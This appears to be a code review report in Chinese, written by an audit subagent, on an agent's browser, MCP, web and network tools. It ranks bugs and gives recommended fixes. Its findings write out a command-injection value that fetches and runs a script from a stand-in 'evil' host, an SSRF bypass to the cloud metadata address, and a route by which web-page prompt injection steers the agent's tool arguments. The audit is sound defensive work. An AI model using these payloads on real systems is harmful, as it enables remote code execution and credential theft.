# tools 浏览器/MCP/网络/流式集群 Review 报告（Wave 2 · 机制层）

> 只读审查 · 2026-10-16 · 子代理 w2-web-browser

## 规模

| 范围 | 文件数 | LOC |
|---|---|---|
| browser/（含 cdp_backend/ 子目录） | 8 | 3,342 |
| mcp/ | 5 | 991 |
| web.rs | 1 | 766 |
| http_request.rs | 1 | 644 |
| network_monitor.rs | 1 | 830 |
| community_hub.rs | 1 | 907 |
| stream_subscribe.rs | 1 | 1,762 |
| **合计** | **18** | **9,252** |

参照：ssrf.rs（205）、bounded_io.rs、html_to_md.rs 为被依赖的支撑模块，未计入。

## 模块地图（文件职责表）

| 文件 | 职责 | 关键机制 |
|---|---|---|
| browser/backend.rs | `BrowserBackend` trait + `BrowserRequest` seam | browse 工具与驱动实现解耦（CDP/Playwright/远程可替换） |
| browser/cdp.rs | 低层 CDP WebSocket 客户端 | 命令/响应/事件分发；30s 命令超时；Drop abort reader/writer 任务 |
| browser/cdp_backend.rs | `CdpBrowserBackend`：30+ action 实现 | 全局 `SESSION_MANAGER`（daemon 模型）；navigate/snapshot/click/fill/tabs/upload/dialog/network 拦截 |
| browser/cdp_backend/tool_helpers.rs | 无状态辅助 | ref/selector 解析、坐标换算、按键解析、CDP 错误转换 |
| browser/session.rs | 会话与浏览器生命周期 | Chrome/Edge/Firefox 启动、自由端口发现、/json 端点轮询、会话名消毒 |
| browser/snapshot.rs | AX 树快照与 ref 系统 | parse_ax_tree / assign_refs / render_tree（compact、max_depth=15） |
| browser/tool.rs | `browse` 工具 schema 与路由 | action 枚举 + prompt_rule（截图路径规则） |
| mcp/client.rs | stdio JSON-RPC MCP 客户端 | initialize 握手、tools/list、tools/call；独立 reader 线程；Drop kill 子进程 |
| mcp/manager.rs | MCP server 注册表 | 懒启动 + 双重检查锁、auto_start、>20 工具走渐进式发现 |
| mcp/provider.rs | `McpToolWrapper` | 把远端 MCP 工具包装为本地 `Tool`（`server__tool` 命名） |
| mcp/search.rs | `mcp_search_tools` | 渐进式发现的全文检索工具 |
| web.rs | `web_search` / `web_fetch` | Brave/Baidu 双后端；markdown 内容协商；JS challenge 检测 + CDP 回退 |
| http_request.rs | 通用 HTTP 工具 | 全方法/认证/表单/文件下载（100MB 上限） |
| network_monitor.rs | 网络诊断工具 | ping/traceroute/port_scan/ssl_check/dns/whois/http_check/bandwidth |
| community_hub.rs | 社区 Hub 客户端 + 技能安装 | staging 目录 + static_audit + 原子提升 + 回滚；路径禁锢 |
| stream_subscribe.rs | WS/SSE 长连接订阅 | 全局 StreamManager、断线指数退避重连、磁盘持久化恢复、buffer 背压 |

## 问题清单

| 级别 | 位置 文件:行 | 问题 | 证据/说明 |
|---|---|---|---|
| P0 | network_monitor.rs:375-385, 442-448 | **命令注入**：`action_ssl_check` 将 `host` 原样拼接进 `sh -c` 字符串 | `format!("echo \| openssl s_client -connect {}:{} -servername {} ...", host, port, host)` 后 `Command::new("sh").arg("-c")`。`host` 是工具参数（可被网页 prompt injection 诱导），`host="x;curl evil\|sh"` 即任意命令执行。同文件 ping/traceroute/dig/whois 均用参数数组，唯独 ssl_check 用 shell 拼接。 |
| P1 | cdp_backend.rs:20-30（ensure_manager）、web.rs:464-474（FETCH_CDP_MANAGER） | **多 workspace 串库**：两个全局 static SessionManager 均为"首个 workspace 胜出" | `ensure_manager` 仅在 `guard.is_none()` 时用首个 workspace 建 base_dir；后续所有 workspace 的浏览器 profile/cookie 都落在第一个调用者的 `workspace/browser/sessions/` 下。stream_subscribe 与 gateway API 已按 workspace 隔离设计，说明进程内多 workspace 是既定场景 → 跨 workspace 浏览器数据 bleed。 |
| P1 | network_monitor.rs:639-643, 696-699 | **SSRF 防护被同集群兄弟工具绕过**：http_check/bandwidth 用裸 `reqwest::Client::builder()` | 无 `safe_client_builder()`、无 `ensure_url_allowed()`、无 redirect 策略。`http_request`/`web_fetch` 精心构建的 SSRF 防线（ssrf.rs）可经 `network_monitor action=http_check url=http://169.254.169.254/...` 一行绕过；port_scan/ping/ssl_check 亦可直达内网任意主机。 |
| P1 | web.rs:523-528 | **finalUrl 取值错误**：CDP 回退路径把 outerHTML 当 URL | `eval.get("result").get("value")` 取出的是整页 HTML，赋给 `current_url` 后作为 `finalUrl` 返回——结果 JSON 中 finalUrl 字段携带整页 HTML（正确做法是 `window.location.href`），既错误又使输出体积翻倍。 |
| P2 | cdp_backend.rs:1000-1015 | **network_intercept 是单向陷阱 + 文档契约不符** | `Fetch.enable` 后没有任何 action 能 disable；`Fetch.requestPaused` 事件未订阅/未转发给 agent，agent 拿不到 `request_id`，`network_continue` 实际不可用；且拦截一旦开启会跨导航持续暂停匹配请求直到超时。docs/07_browser_automation.md:265-280 明确承诺"每个匹配的请求都会暂停，AI 可以决定是继续还是返回自定义响应"——端到端工作流不成立。 |
| P2 | cdp_backend.rs:1024, 1037 | **headers 参数类型契约不一致** | `network_continue` 用 `params["headers"].as_array()` 读取，但 browse schema（tool.rs:122-125）声明 `headers` 为 object；按文档传 object 时数组解析为 None，header 修改被静默丢弃（fulfill 路径的 responseHeaders 同理）。 |
| P2 | stream_subscribe.rs:612-642 | **subscribe 错误路径泄漏订阅并污染持久化** | 订阅与 cancel_handle 在 line 612-617 已插入 STREAM_MANAGER 并 `save_rules`，之后 protocol 非法（如 "ftp"）才在 623-640 返回 Err——僵尸订阅永久留在内存 map 且被写入 subscriptions.json；validate 不校验 protocol 枚举，该路径可稳定触发。 |
| P2 | stream_subscribe.rs:1026-1075 | **流式摄入无背压、全局锁串行化、内存无总量上限** | 每条消息都持全局 `STREAM_MANAGER` 锁（所有流+所有 read/list 共用一把锁）；trim 用 `Vec::remove(0)`（O(buffer_size)，默认 100、上限 10,000）；单消息上限 1MB × 缓冲 10,000 条 = 单流理论 10GB，且订阅数量无上限（每个 subscribe 一个 task）。WS 侧有 max_message_size，SSE 侧有单事件 1MB 检查，但都只限单条不限总量。 |
| P2 | mcp/client.rs:353-405 | **reader 线程行长度无上限** | `BufReader::read_until(b'\n', &mut buf)` 对第三方 MCP server 的输出不设长度限制；恶意/异常 server 不发换行即可无限增长 buf → OOM。信任模型中 MCP server 是可替换的第三方进程，应限制单行大小（如 10MB）并断开。 |
| P2 | mcp/client.rs:258-273 | **tools/list 分页被忽略** | MCP 协议支持 `nextCursor` 分页；实现直接取 `result.tools`，工具数超过一页时静默丢失后续工具（对 GitHub 等大工具集 server 是实际风险）。 |
| P2 | mcp/client.rs:235-255 | **协议版本硬编码且无协商校验** | `protocolVersion: "2024-11-05"`；server 返回的版本/capabilities 完全不校验。现行 MCP 规范已是 2025-03-26，硬编码旧版本在新 server 上可能被拒绝（虽多数 server 向后兼容）。 |
| P2 | mcp/provider.rs:45-78 | **MCP 工具包装器未声明执行规格（违反已知不变量）** | `McpToolWrapper` 未 override `execution_environment`（默认 InProcess，实际是远程子进程执行）/ `requires_confirmation`（默认 false）/ `required_permissions`。第三方 server（filesystem/DB/exec 类）的破坏性工具无任何准入声明，用户也无法按工具粒度要求确认——与 `exec_local` 声明 FullAccess、`web_*` 声明 Network 的既有模式不一致。 |
| P2 | browser/tool.rs:31-238 | **BrowseTool 同样未声明执行规格** | browse 具备网络访问（浏览器导航）、任意 JS 执行、跨 workspace 任意路径写（screenshot/pdf `output_path` 绝对路径拷贝）、任意路径文件上传（upload_file 只查存在性），却未声明 environment/permissions/confirmation。与 exec_local（FullAccess）对照，`validate()` 也恒返回 Ok。 |
| P2 | session.rs:202-208 | **Chrome stderr 管道从不读取** | `.stderr(Stdio::piped())` 但 `child.stderr` 从未 take/drain；子进程写入超过管道缓冲区（约 64KB）后阻塞——错误/崩溃日志密集时可能挂住浏览器进程。应改 `Stdio::null()` 或后台 drain。 |
| P2 | cdp_backend.rs:67-122（perform） | **全局互斥覆盖整个 action（含 30s 等待）** | 所有 session 的所有 browse 调用串行在一把 `tokio::sync::Mutex` 上，一次卡住的 navigate（load 事件 30s 超时）阻塞全部会话；浏览器实例池实为"池大小 1"。 |
| P3 | cdp_backend.rs:399-404, 421-424; tool_helpers.rs:130-133 | selector 注入 JS 的转义不一致 | scroll/wait/focus 路径仅 `replace('\'', "\\'")`（尾随反斜杠只会造成语法错误，无注入），而 click 路径（tool_helpers.rs:83-88）完整转义 `\ ' " \` ${`。建议统一用 JSON.stringify 传参，避免语法错误噪声。 |
| P3 | cdp_backend.rs:470-478, 534-542 | screenshot/pdf `output_path` 相对路径按进程 CWD 解析 | `PathBuf::from(p)` 对相对路径不在 workspace 下解析；`~/` 前缀外的 `~` 不展开。 |
| P3 | cdp_backend.rs:467, 531 | 截图/PDF 文件名秒级时间戳碰撞 | 同一秒内两次截图互相覆盖。 |
| P3 | session.rs:116-132 | `get_or_create_with_engine` 对已存在会话忽略 engine/headed | 二次以 `browser=firefox` 调用已存在的 chrome "default" 会话时静默复用旧引擎，schema 描述具有误导性。 |
| P3 | stream_subscribe.rs:209-213 vs 579-587 | **schema 默认值与实现不符** | schema 写 `auto_restore` "Default: true"，实现 `unwrap_or(false)`；schema 写 `max_reconnect` "Default: 0"（unlimited），实现 `unwrap_or(10)`。 |
| P3 | stream_subscribe.rs:1343-1347 | 恢复时改写 max_reconnect | 持久化规则 `max_reconnect=0`（文档语义 unlimited）恢复时变成 10，重启后语义漂移。 |
| P3 | stream_subscribe.rs:1163 | `action_read` 的 `limit` 未 clamp | 与 search 的 clamp(1,20) 模式不一致；大 limit 可一次性导出全部缓冲（10K 条 × 大消息）。 |
| P3 | stream_subscribe.rs:1078-1091 | 重连与 auto_restore 耦合 | `should_reconnect` 以 `!sub.auto_restore → false` 拒绝重连：非持久化订阅（默认）永不重连，"重连次数"参数对默认订阅完全失效，两个概念被混为一谈。 |
| P3 | stream_subscribe.rs:1437-1452 | gateway `get_stream_data` 无 workspace 过滤 | 工具层所有 action 都校验 `owner_workspace`，gateway 读取端点没有，跨 workspace 数据可读（依赖上层鉴权）。 |
| P3 | mcp/manager.rs:98-147 | MCP server 崩溃后无恢复 | client 缓存不失效：server 进程死亡后 `client_for` 继续返回死 client，所有调用报 "server closed"，直到进程重启。 |
| P3 | mcp/manager.rs:22-33 | `server__tool` 分隔符歧义 | `McpToolTarget::parse` 用 `split_once("__")`，server 名或工具名含 `__` 时解析歧义（当前无 sanitize）。 |
| P3 | snapshot.rs:358-364; cdp_backend.rs:1083 | 快照输出无总量上限 | get_content 有 50K 字符截断，snapshot 没有——巨型页面（含完整 refs map）直接进模型上下文；max_depth=15 只限渲染深度不限节点数。 |
| P3 | session.rs:256-267, 397-420 | Firefox CDP 发现依赖 Chromium 风格 HTTP 端点 | `/json/version`、`/json/list` 是 Chromium 专有 API；Firefox 侧依赖版本较新的 CDP HTTP 兼容层，失败时以错误形式优雅降级，但 firefox 引擎实际可用性未经证实（无测试）。 |
| P3 | cdp_backend.rs:83 | `perform` 中 `mgr_guard.as_mut().unwrap()` | ensure_manager 保证 Some，但 unwrap 在库代码中仍是不必要风险点。 |

### 各维度结论

- **① 正确性**：CDP 协议边界基本覆盖（navigate 前订阅 load 事件防竞态、errorText 检查、30s 超时回退固定等待、close_target 越界检查），但**无页面崩溃处理**（Page.crashed / Inspector.targetCrashed 未订阅，renderer 崩溃后 evaluate 报错但无恢复/提示，已检查）；MCP 生命周期正确（initialize→notifications/initialized→tools/list→tools/call，超时清理 pending），但分页/版本协商缺失（P2）；流式订阅 SSE 解析正确（多行 data 拼接、心跳注释行忽略），但见 P2 背压问题。
- **② 并发**：浏览器"池"实为全局单锁串行（P2）；MCP 子进程生命周期有 Drop kill + stdout EOF 级联失败，缺崩溃重连（P3）；异常路径资源：subscribe 错误路径泄漏（P2）、stderr 管道不 drain（P2）；CDP 事件监听器有 closed-sender 回收（亮点）。
- **③ 安全**：SSRF 主干（ssrf.rs：预检 + connect 时 SafeResolver + 重定向 host 校验，防 DNS rebinding）质量高；但 network_monitor 两处 bypass（P1）与 ssl_check 命令注入（P0）；MCP 信任模型靠用户配置准入，但工具包装层无声明（P2）；社区技能安装的供应链防护（staging+审计+回滚+zip 炸弹比率+条目数+体积限制）是全书最好的一段；浏览器下载路径（screenshot/pdf output_path）可写任意绝对路径且无确认声明（P2）。
- **④ 性能**：snapshot 无总量上限（P3）；buffer_message 全局锁 + Vec::remove(0)（P2）；web_fetch 的 challenge 启发式会把任何 <500 字符的 200 页面误判为 challenge 触发浏览器启动（P3，且默认 SSRF 开启时 CDP 回退根本不执行，web.rs:421）。
- **⑤ 测试覆盖**：browser 有 schema/helper 单测（key 解析、ref 分配、render、sanitize）+ FakeBackend 路由测试；web/http_request 有 SSRF 拒绝测试；community_hub 有路径逃逸与审计 payload 测试（质量高）；**但 mcp/client.rs 零测试**（initialize/tools/call 生命周期、reader 线程、超时均无 fake-server 协议级测试），cdp.rs 零测试，stream_subscribe 无 WS/SSE 往返、SSE 解析器、背压、SSRF 拒绝测试。无 CDP 协议级测试（页面崩溃/导航中断场景未覆盖）。
- **⑥ 可维护性**：backend seam、tool_helpers 抽取、模块注释（含已知 find_free_port 竞态的说明）良好；cdp_backend.rs 1,184 行为单文件巨物，30+ action 平铺，可按域拆分（navigation/interaction/network/tabs）；全局 static ×3（SESSION_MANAGER、FETCH_CDP_MANAGER、STREAM_MANAGER）使测试与多 workspace 部署困难。
- **⑦ 契约一致性**：docs/19 与 mcp/ 实现一致（配置层、autoStart、超时默认值、server 绑定权限）；docs/07 与 browser 大体一致（引擎、session 复用、截图路径规则），**但 network_intercept 的"每请求可继续"描述与实现不符**（P2）；stream_subscribe schema 默认值与实现两处不符（P3）；MCP 协议版本落后于现行规范（P3/P2）。

## 亮点

1. **ssrf.rs 双层防护**：`ensure_url_allowed` 预检 + `SafeResolver` 在 connect 时再校验 + 重定向策略 host 校验，覆盖 DNS rebinding 窗口、IPv4-mapped IPv6、CGNAT(100.64/10)、元数据地址；`web.rs:713` 有针对 169.254.169.254 的回归测试。
2. **community_hub 供应链防护**：zip 解压走 `enclosed_name()` + 条目数/单文件/总量/压缩比四重限制 + staging 目录 + `static_audit` 通过后才原子 rename 提升 + 失败回滚 backup；凭证仅同源才附带（same_origin 检查）；URL 脱敏进日志。审计 payload 有针对性单测。
3. **CDP navigate 竞态处理**：先订阅 `Page.loadEventFired` 再发起导航，避免快页面丢事件；超时/通道关闭均有回退；reader 任务回收 closed sender 防监听器累积（cdp.rs:89-91 有注释）。
4. **stream_subscribe 的持久化/恢复**：subscriptions.json + per-workspace 恢复去重 + 指数退避（2/4/8/16/30s 封顶）+ watch channel 取消 + 工作区归属校验（unsubscribe/read/send 均校验 owner_workspace）。
5. **MCP 渐进式发现**：>20 工具自动切换 search 模式（模型隐藏具体工具、暴露 mcp_search_tools），prompt_index 动态生成使用说明。
6. **bounded_io / safe_truncate 的普遍使用**：所有 HTTP 响应读取都有字节上限，截断均做 UTF-8 边界回退。

## 建议

按优先级：

1. **修 P0**：`action_ssl_check` 两处 `sh -c` 拼接改为参数数组（拆成两次 `Command::new("openssl")` 调用或管道子进程），并在同文件加一条"host 含 shell 元字符"的回归测试。同类审查建议全仓扫一遍 `Command::new("sh")` / `format!` 入参模式。
2. **修 P1×3**：① 全局 SessionManager 改为 `HashMap<PathBuf, SessionManager>` 或把 workspace 作为 key 的一部分（cdp_backend.rs 与 web.rs 两处）；② network_monitor 的 http_check/bandwidth 换用 `safe_client_builder` + `ensure_url_allowed`（port_scan 等诊断动作如不需要内网可达，同样加防护或至少在 schema 说明"仅公网"）；③ web.rs CDP 回退补 `window.location.href` 取 finalUrl。
3. **MCP 客户端加固（P2）**：reader 行长度上限；tools/list 支持 nextCursor 循环；protocolVersion 升级并校验 server 返回值；给 McpToolWrapper 声明 execution_environment=Network（或按 server 配置）+ 提供确认钩子；补一个 fake stdio server 的协议级测试（initialize→tools/list→tools/call→错误→超时）。
4. **stream_subscribe**：subscribe 的协议校验前置到持久化之前；buffer 改 VecDeque 或环形缓冲并按 stream_id 分锁；加单流总字节上限与订阅数上限；修正 schema 默认值；restore 保留原始 max_reconnect=0 语义。
5. **browse**：声明 execution_environment/权限；network_intercept 增加 requestPaused 事件汇聚（例如捕获事件进 buffer 并在 snapshot/status 中暴露 request_id）或至少提供 network_intercept_disable；修正 docs/07 相应段落或补上事件暴露能力。
6. **杂项（P3）**：snapshot 输出加字符总量上限；session.rs stderr 改 null；screenshot 文件名加毫秒/uuid；统一 selector 转义（JSON.stringify）；cdp_backend.rs 按域拆文件。

## 分级汇总

- **P0：1**（network_monitor ssl_check 命令注入）
- **P1：3**（浏览器会话跨 workspace 串库；network_monitor 绕过 SSRF；web.rs CDP 回退 finalUrl 错误）
- **P2：10**（network_intercept 单向陷阱+文档契约、headers 类型契约、subscribe 错误路径泄漏、流式背压/全局锁/内存、MCP 行长度无上限、tools/list 分页、MCP 版本硬编码、MCP 包装器无执行规格、browse 无执行规格、Chrome stderr 管道、browse 全局锁串行——其中后两项可合并计）
- **P3：11**
